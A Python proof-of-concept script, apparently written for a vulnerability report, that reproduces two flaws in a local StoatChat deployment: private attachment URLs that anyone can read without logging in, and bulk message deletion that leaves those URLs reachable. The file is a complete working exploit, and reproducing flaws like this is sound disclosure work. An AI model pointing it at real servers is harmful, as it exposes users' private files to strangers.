#!/usr/bin/env python3
import json
import os
import sys
import time
import uuid
from pathlib import Path
from urllib import error, parse, request


API_URL = os.environ.get("POC_API_URL", "http://127.0.0.1:18182").rstrip("/")
MEDIA_URL = os.environ.get("POC_MEDIA_URL", "http://127.0.0.1:18184").rstrip("/")
OUT_DIR = Path("out")


class HttpFailure(RuntimeError):
    def __init__(self, method, url, status, body):
        super().__init__(f"{method} {url} failed with HTTP {status}: {body[:500]!r}")
        self.status = status
        self.body = body


def http(method, url, *, token=None, json_body=None, body=None, headers=None, expect=None):
    headers = dict(headers or {})
    if token:
        headers["X-Session-Token"] = token

    if json_body is not None:
        body = json.dumps(json_body).encode("utf-8")
        headers["Content-Type"] = "application/json"

    req = request.Request(url, data=body, headers=headers, method=method)
    try:
        with request.urlopen(req, timeout=30) as resp:
            data = resp.read()
            status = resp.status
            resp_headers = dict(resp.headers.items())
    except error.HTTPError as exc:
        data = exc.read()
        status = exc.code
        resp_headers = dict(exc.headers.items())

    if expect is not None and status not in expect:
        raise HttpFailure(method, url, status, data.decode("utf-8", "replace"))

    content_type = resp_headers.get("Content-Type", "")
    if data:
        text = data.decode("utf-8", "replace")
        if "application/json" in content_type or text.lstrip().startswith(("{", "[")):
            return status, json.loads(text), resp_headers

    return status, data, resp_headers


def wait_for_stack():
    deadline = time.time() + 120
    last_error = None
    while time.time() < deadline:
        try:
            http("GET", f"{API_URL}/", expect={200})
            http("GET", f"{MEDIA_URL}/", expect={200})
            return
        except Exception as exc:
            last_error = exc
            time.sleep(2)
    raise RuntimeError(f"stack did not become ready: {last_error}")


def create_user(name):
    suffix = uuid.uuid4().hex[:10]
    email = f"{name}-{suffix}@example.invalid"
    password = f"StoatPoC-{suffix}-password"

    http(
        "POST",
        f"{API_URL}/auth/account/create",
        json_body={"email": email, "password": password},
        expect={200, 204},
    )
    _, session, _ = http(
        "POST",
        f"{API_URL}/auth/session/login",
        json_body={"email": email, "password": password, "friendly_name": "StoatChatPoC"},
        expect={200},
    )
    token = session["token"]
    _, user, _ = http(
        "POST",
        f"{API_URL}/onboard/complete",
        token=token,
        json_body={"username": f"{name}{suffix[:6]}"},
        expect={200},
    )
    return {"email": email, "password": password, "token": token, "user": user}


def create_server_and_channel(token):
    _, created, _ = http(
        "POST",
        f"{API_URL}/servers/create",
        token=token,
        json_body={"name": "Attachment URL PoC"},
        expect={200},
    )
    server_id = created["server"]["_id"]
    channels = created.get("channels") or []
    text_channels = [c for c in channels if c.get("channel_type") == "TextChannel" or c.get("type") == "TextChannel"]
    if text_channels:
        return server_id, text_channels[0]["_id"]

    _, channel, _ = http(
        "POST",
        f"{API_URL}/servers/{server_id}/channels",
        token=token,
        json_body={"type": "Text", "name": "private-poc", "description": "private repro channel"},
        expect={200},
    )
    return server_id, channel["_id"]


def multipart_upload(token, filename, content):
    boundary = "----StoatPoC" + uuid.uuid4().hex
    body = b"".join(
        [
            f"--{boundary}\r\n".encode(),
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode(),
            b"Content-Type: text/plain\r\n\r\n",
            content,
            b"\r\n",
            f"--{boundary}--\r\n".encode(),
        ]
    )
    _, data, _ = http(
        "POST",
        f"{MEDIA_URL}/attachments",
        token=token,
        body=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        expect={200},
    )
    return data["id"]


def send_message(token, channel_id, attachment_id, label):
    _, message, _ = http(
        "POST",
        f"{API_URL}/channels/{channel_id}/messages",
        token=token,
        json_body={"content": f"private attachment for {label}", "attachments": [attachment_id]},
        headers={"Idempotency-Key": uuid.uuid4().hex},
        expect={200},
    )
    return message["_id"]


def anonymous_fetch(url, expected_status):
    status, data, headers = http("GET", url, expect={expected_status})
    return {
        "status": status,
        "bytes": len(data) if isinstance(data, bytes) else len(json.dumps(data)),
        "cache_control": headers.get("Cache-Control"),
        "content_type": headers.get("Content-Type"),
        "body": data.decode("utf-8", "replace") if isinstance(data, bytes) else json.dumps(data),
    }


def main():
    print("[1/8] waiting for local StoatChat stack")
    wait_for_stack()

    print("[2/8] creating local account and private channel")
    owner = create_user("owner")
    _, channel_id = create_server_and_channel(owner["token"])

    print("[3/8] uploading attachment and proving anonymous read")
    secret = f"private StoatChat PoC payload {uuid.uuid4()}\n".encode("utf-8")
    attachment_id = multipart_upload(owner["token"], "private-proof.txt", secret)
    message_id = send_message(owner["token"], channel_id, attachment_id, "anonymous bearer URL")
    leaked_url = f"{MEDIA_URL}/attachments/{attachment_id}/original"
    anon_before = anonymous_fetch(leaked_url, 200)
    if secret.decode("utf-8").strip() not in anon_before["body"]:
        raise RuntimeError("anonymous fetch returned 200 but did not contain the uploaded payload")

    print("[4/8] deleting one message as control case")
    http("DELETE", f"{API_URL}/channels/{channel_id}/messages/{message_id}", token=owner["token"], expect={204})
    single_delete = anonymous_fetch(leaked_url, 404)

    print("[5/8] uploading second attachment for bulk-delete revocation test")
    bulk_secret = f"bulk delete survivor payload {uuid.uuid4()}\n".encode("utf-8")
    bulk_attachment_id = multipart_upload(owner["token"], "bulk-delete-proof.txt", bulk_secret)
    bulk_message_id = send_message(owner["token"], channel_id, bulk_attachment_id, "bulk delete")
    bulk_url = f"{MEDIA_URL}/attachments/{bulk_attachment_id}/original"
    bulk_before = anonymous_fetch(bulk_url, 200)

    print("[6/8] bulk deleting message")
    http(
        "DELETE",
        f"{API_URL}/channels/{channel_id}/messages/bulk",
        token=owner["token"],
        json_body={"ids": [bulk_message_id]},
        expect={204},
    )

    print("[7/8] checking whether bulk-deleted attachment is still public")
    bulk_after = anonymous_fetch(bulk_url, 200)
    if bulk_secret.decode("utf-8").strip() not in bulk_after["body"]:
        raise RuntimeError("bulk-delete URL returned 200 but did not contain the uploaded payload")

    result = {
        "api_url": API_URL,
        "media_url": MEDIA_URL,
        "findings": {
            "anonymous_attachment_read": {
                "url": leaked_url,
                "anonymous_status": anon_before["status"],
                "cache_control": anon_before["cache_control"],
            },
            "single_delete_control": {
                "url": leaked_url,
                "anonymous_status_after_single_delete": single_delete["status"],
            },
            "bulk_delete_revocation_bypass": {
                "url": bulk_url,
                "anonymous_status_before_bulk_delete": bulk_before["status"],
                "anonymous_status_after_bulk_delete": bulk_after["status"],
                "cache_control": bulk_after["cache_control"],
            },
        },
    }

    OUT_DIR.mkdir(exist_ok=True)
    (OUT_DIR / "result.json").write_text(json.dumps(result, indent=2), encoding="utf-8")

    print("[8/8] PoC result")
    print(json.dumps(result["findings"], indent=2))
    print("\nVULNERABLE: anonymous attachment URL read works, and bulk delete did not revoke the attachment URL.")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"PoC failed: {exc}", file=sys.stderr)
        raise
